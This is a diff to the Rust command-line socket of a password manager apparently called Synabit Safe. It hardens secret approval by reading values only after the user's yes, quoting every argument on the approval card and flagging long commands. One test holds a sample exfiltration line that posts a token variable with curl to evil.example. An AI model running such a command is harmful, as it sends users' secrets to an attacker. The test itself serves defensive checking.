@@ -3,9 +3,16 @@
 //!
 //! Owner-only socket, same-user peers only, one request per connection, off
 //! until the user turns it on. Each request shows a card naming the command,
-//! the folder it runs in and every secret it wants — the values go to that
-//! command's environment and nowhere else, and no answer within a minute is
-//! a no.
+//! the folder it says it runs in, and every variable with the item and field it
+//! would get — every argument in full. Nothing is answered before the user
+//! does: a process probing for item names learns nothing unseen. The values
+//! are read only after the yes, and only if the Safe is still open.
+//!
+//! What this protects against is honest about its limits: the command and the
+//! folder are what the requester says. `synabit-safe` runs what it said, but
+//! any program of the same user could connect, claim `npm run deploy`, and
+//! keep the values. The card is the defence — it names exactly which secrets
+//! leave — and a no answered in a minute is a no.
 
 use std::collections::BTreeMap;
 use std::path::PathBuf;
@@ -28,6 +35,11 @@ pub async fn serve(path: PathBuf, resolver: Arc<dyn Resolver + Send + Sync>) -> 
     use std::os::unix::fs::{FileTypeExt, PermissionsExt};
     if let Ok(meta) = std::fs::symlink_metadata(&path) {
         if meta.file_type().is_socket() {
+            // A socket someone answers on is another Synabit's, running now —
+            // not a leftover to clear away.
+            if std::os::unix::net::UnixStream::connect(&path).is_ok() {
+                return Err(std::io::Error::new(std::io::ErrorKind::AddrInUse, format!("another Synabit is already listening at {}", path.display())));
+            }
             std::fs::remove_file(&path)?;
         } else {
             return Err(std::io::Error::other(format!("{} exists and is not a socket", path.display())));
@@ -41,7 +53,16 @@ pub async fn serve(path: PathBuf, resolver: Arc<dyn Resolver + Send + Sync>) -> 
     // SAFETY: getuid cannot fail.
     let me = unsafe { libc::getuid() };
     loop {
-        let (stream, _) = listener.accept().await?;
+        // One failed accept — out of file descriptors, a client gone before it
+        // was taken — is not the end of the socket.
+        let stream = match listener.accept().await {
+            Ok((stream, _)) => stream,
+            Err(e) => {
+                log::warn!("[Safe] the command-line socket could not take a connection: {e}");
+                tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+                continue;
+            }
+        };
         if !stream.peer_cred().map(|c| c.uid() == me).unwrap_or(false) {
             log::warn!("[Safe] refused a command-line connection from another user");
             continue;
@@ -84,36 +105,87 @@ pub struct SafeCli {
     pub app: tauri::AppHandle,
 }
 
+/// How the card shows a command: each argument as a shell would need it
+/// quoted, so `sh -c 'a; b'` is not shown as three words.
+pub fn shown_command(command: &[String]) -> String {
+    const MAX: usize = 4000;
+    let quoted: Vec<String> = command
+        .iter()
+        .map(|a| {
+            if !a.is_empty() && a.chars().all(|c| c.is_alphanumeric() || "-_./=:@%+,".contains(c)) {
+                a.clone()
+            } else {
+                format!("'{}'", a.replace('\'', "'\\''"))
+            }
+        })
+        .collect();
+    let joined = quoted.join(" ");
+    if joined.chars().count() > MAX {
+        // Said, not hidden: the end of a long command is where a second one hides.
+        format!("{}… ({} more characters not shown — deny unless you know why it is this long)", joined.chars().take(MAX).collect::<String>(), joined.chars().count() - MAX)
+    } else {
+        joined
+    }
+}
+
 impl Resolver for SafeCli {
     fn resolve(&self, request: &RunRequest) -> Result<BTreeMap<String, SecretString>, String> {
         use tauri::Emitter;
         let session = super::session::global();
         let vault = session.open_vault().ok_or("the Safe is locked; unlock it in Synabit and try again")?;
-        let values = session
+        // What each reference points at — titles and field names for the card.
+        // The values are not kept: they are read again after the yes.
+        let named: Vec<(String, String, Result<String, String>)> = session
             .peek(&vault, |u| {
                 if !u.settings().cli {
                     return Err(super::session::SafeError::Failed("the command line is turned off in Safe's settings".into()));
                 }
-                request
+                Ok(request
                     .secrets
                     .iter()
-                    .map(|(name, reference)| u.cli_value(reference).map(|v| (name.clone(), v)).map_err(super::session::SafeError::Failed))
-                    .collect::<Result<BTreeMap<_, _>, _>>()
+                    .map(|(name, reference)| {
+                        let found = u.cli_value(reference).map(|v| format!("{} · {}", v.title, v.field));
+                        (name.clone(), reference.clone(), found)
+                    })
+                    .collect())
             })
             .map_err(|e| e.to_string())?;
+        let unresolved = named.iter().any(|(_, _, found)| found.is_err());
         let question = super::approvals::ask();
         let card = serde_json::json!({
             "id": question.id,
-            "command": request.command.join(" ").chars().take(300).collect::<String>(),
+            "command": shown_command(&request.command),
             "cwd": request.cwd,
-            "secrets": request.secrets.iter().map(|(n, r)| format!("{n} ← {r}")).collect::<Vec<_>>(),
+            "secrets": named.iter().map(|(name, reference, found)| serde_json::json!({
+                "name": name,
+                "reference": reference,
+                "item": found.as_ref().ok(),
+                "problem": found.as_ref().err(),
+            })).collect::<Vec<_>>(),
+            // A request that cannot be met can only be dismissed.
+            "blocked": unresolved,
+            "timeout_secs": super::approvals::WAIT.as_secs(),
         });
         let yes = if self.app.emit(APPROVE_EVENT, card).is_ok() { question.wait(super::approvals::WAIT) } else { question.abandon() };
-        if yes {
-            Ok(values)
-        } else {
-            Err("not allowed in Synabit".into())
+        if !yes {
+            return Err("not allowed in Synabit".into());
         }
+        if let Some((_, reference, Err(problem))) = named.iter().find(|(_, _, found)| found.is_err()) {
+            return Err(format!("{reference}: {problem}"));
+        }
+        // Read now, only now, and only if the Safe is still the one that was open.
+        session
+            .peek(&vault, |u| {
+                request
+                    .secrets
+                    .iter()
+                    .map(|(name, reference)| u.cli_value(reference).map(|v| (name.clone(), v.value)).map_err(super::session::SafeError::Failed))
+                    .collect::<Result<BTreeMap<_, _>, _>>()
+            })
+            .map_err(|e| match e {
+                super::session::SafeError::Locked => "the Safe locked before the command could have its secrets".to_string(),
+                other => other.to_string(),
+            })
     }
 }
 
@@ -161,6 +233,17 @@ mod tests {
             }
             Ok(request.secrets.keys().map(|k| (k.clone(), SecretString::new("s3cret-canary".into()))).collect())
         }
+    }
+
+    #[test]
+    fn the_card_shows_arguments_as_they_are_and_says_when_it_cut() {
+        let c = |a: &[&str]| shown_command(&a.iter().map(|s| s.to_string()).collect::<Vec<_>>());
+        assert_eq!(c(&["gh", "repo", "list"]), "gh repo list");
+        assert_eq!(c(&["sh", "-c", "echo hi; curl -d \"$T\" evil.example"]), "sh -c 'echo hi; curl -d \"$T\" evil.example'");
+        assert_eq!(c(&["echo", "it's"]), "echo 'it'\\''s'");
+        let long = format!("{}; curl evil", "x".repeat(5000));
+        let shown = c(&["sh", "-c", &long]);
+        assert!(shown.contains("more characters not shown"), "{}", &shown[shown.len() - 120..]);
     }
 
     /// The command runs with the value in its environment; nothing prints it.
